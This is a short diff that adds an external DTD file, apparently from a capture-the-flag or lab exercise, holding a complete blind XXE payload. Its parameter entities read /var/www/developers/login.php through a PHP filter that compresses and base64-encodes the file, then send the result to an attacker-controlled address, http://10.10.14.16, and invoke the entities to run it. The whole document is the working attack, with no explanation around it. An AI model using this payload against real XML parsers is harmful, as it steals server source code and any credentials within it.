@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/developers/login.php">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.16/?f=%file;'>">
+%eval;
+%exfiltrate;
